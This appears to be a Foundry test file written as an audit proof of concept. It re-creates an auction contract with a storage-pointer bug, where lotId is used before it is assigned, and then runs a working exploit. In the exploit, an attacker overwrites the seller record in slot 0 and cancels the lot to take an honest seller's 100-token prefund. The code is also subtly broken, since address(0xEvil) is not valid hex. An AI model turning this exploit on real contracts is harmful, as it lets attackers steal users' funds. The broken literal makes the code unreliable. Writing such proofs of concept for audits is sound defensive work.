pragma solidity 0.8.19;

import "forge-std/Test.sol";
import {ERC20} from "lib/solmate/src/tokens/ERC20.sol";
import {Auctioneer} from "src/bases/Auctioneer.sol"; // keep the reference to the original contract for auditors’ convenience

/*//////////////////////////////////////////////////////////////
//                      Minimal Re-Creation
//  ––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––
//  The real exploit stems from the incorrect use of the return
//  variable ‘lotId’ inside Auctioneer.auction() *before* it is
//  assigned the actual ID. The following stripped-down contract
//  re-implements only the affected logic, avoiding every other
//  dependency so the PoC stays lightweight yet faithful.      //
//////////////////////////////////////////////////////////////*/

contract VulnerableAuctioneer {
    // ======== Struct mirroring the vulnerable storage layout ======== //
    struct Routing {
        address seller;
        uint96 funding;
        ERC20  baseToken;
    }

    // ======== Minimal state ======== //
    uint96 public lotCounter;                       // identical counter
    mapping(uint96 => Routing) public lotRouting;   // identical mapping

    // ======== Vulnerable auction() implementation (highly simplified) ======== //
    //         - baseToken          → asset funded by seller
    //         - fundingAmount      → amount of baseToken to lock if prefunded
    //         - prefunded          → whether the auction should lock funds up-front
    function auction(ERC20 baseToken, uint96 fundingAmount, bool prefunded)
        external
        returns (uint96 lotId)
    {
        // -------- THE BUG:  lotId is still 0 here ------------------- //
        Routing storage routing = lotRouting[lotId]; // always slot 0
        // ------------------------------------------------------------ //

        bool requiresPrefunding = prefunded;
        uint96 lotCapacity      = fundingAmount;     // used only if prefunded

        // correct ID is assigned *after* the storage pointer is taken
        lotId = lotCounter++;                        // post-increment

        // seller + token updated *at the wrong slot* (lotRouting[0])
        routing.seller    = msg.sender;
        routing.baseToken = baseToken;

        // only prefunded auctions update .funding
        if (requiresPrefunding) {
            routing.funding = lotCapacity;
            baseToken.transferFrom(msg.sender, address(this), lotCapacity);
        }
    }

    // ======== cancel() mirrors the real flow (module call stripped) ======== //
    function cancel(uint96 lotId_) external {
        Routing storage routing = lotRouting[lotId_];

        require(msg.sender == routing.seller, "Not seller");
        uint96 funding = routing.funding;
        routing.funding = 0;                         // effects before interaction

        if (funding > 0) {
            routing.baseToken.transfer(msg.sender, funding);
        }
    }
}

/*//////////////////////////////////////////////////////////////
//                        Test Token (ERC20)
//////////////////////////////////////////////////////////////*/
contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s, uint8 d) ERC20(n, s, d) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/*//////////////////////////////////////////////////////////////
//                          Exploit Test
//////////////////////////////////////////////////////////////*/
contract ExploitTest is Test {
    VulnerableAuctioneer internal auctioneer;
    MockERC20           internal baseToken;

    address internal honest   = address(0xB0B);   // honest seller
    address internal attacker = address(0xEvil);  // malicious actor

    uint256 internal constant FUNDING = 100 ether; // 100 tokens with 18 decimals

    function setUp() public {
        // Deploy contracts
        auctioneer = new VulnerableAuctioneer();
        baseToken  = new MockERC20("Base", "BASE", 18);

        // Mint plenty of tokens
        baseToken.mint(honest,   1_000 ether);
        baseToken.mint(attacker, 1_000 ether);

        // Approvals
        vm.startPrank(honest);
        baseToken.approve(address(auctioneer), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(attacker);
        baseToken.approve(address(auctioneer), type(uint256).max);
        vm.stopPrank();
    }

    function testExploitStealsPrefund() public {
        /*************************************************************
        * Step 1 – Honest user creates a *prefunded* auction.
        *          This moves 100 BASE into the auctioneer contract
        *          and stores them in lotRouting[0].funding.
        *************************************************************/
        vm.startPrank(honest);
        uint96 honestLotId = auctioneer.auction(baseToken, uint96(FUNDING), true);
        vm.stopPrank();

        // Sanity-check: funds are indeed locked
        assertEq(honestLotId, 0, "Honest lot should get ID 0");
        assertEq(baseToken.balanceOf(address(auctioneer)), FUNDING, "Prefunding failed");

        /*************************************************************
        * Step 2 – Attacker immediately creates a *non-prefunded*
        *          auction. Because of the bug, their routing data
        *          overwrites slot 0, but .funding *remains* from the
        *          honest seller (only set when prefunded).
        *************************************************************/
        vm.startPrank(attacker);
        uint96 attackerLotId = auctioneer.auction(baseToken, 0, false);
        vm.stopPrank();

        // Attacker's transaction returned lotId == 1, but their
        // routing data is actually stored at index 0.
        assertEq(attackerLotId, 1, "Attacker should receive logical ID 1");
        (
            address recordedSeller,
            uint96 recordedFunding,

        ) = auctioneer.lotRouting(0);

        // Assert storage corruption: attacker is now the recorded seller
        assertEq(recordedSeller, attacker, "Seller overwritten");
        // funding from honest auction still present
        assertEq(recordedFunding, FUNDING, "Prefund unexpectedly lost");

        /*************************************************************
        * Step 3 – Attacker cancels **lot 0** and rightfully passes
        *          the seller check. The contract refunds the 100 BASE
        *          to the attacker instead of the honest user.
        *************************************************************/
        uint256 attackerBalanceBefore = baseToken.balanceOf(attacker);

        vm.startPrank(attacker);
        auctioneer.cancel(0);
        vm.stopPrank();

        // The stolen funds are now in the attacker’s wallet.
        assertEq(
            baseToken.balanceOf(attacker),
            attackerBalanceBefore + FUNDING,
            "Exploit failed – attacker did not receive prefund"
        );

        // Contract should now hold zero tokens.
        assertEq(
            baseToken.balanceOf(address(auctioneer)),
            0,
            "Auctioneer still holds tokens"
        );
    }
}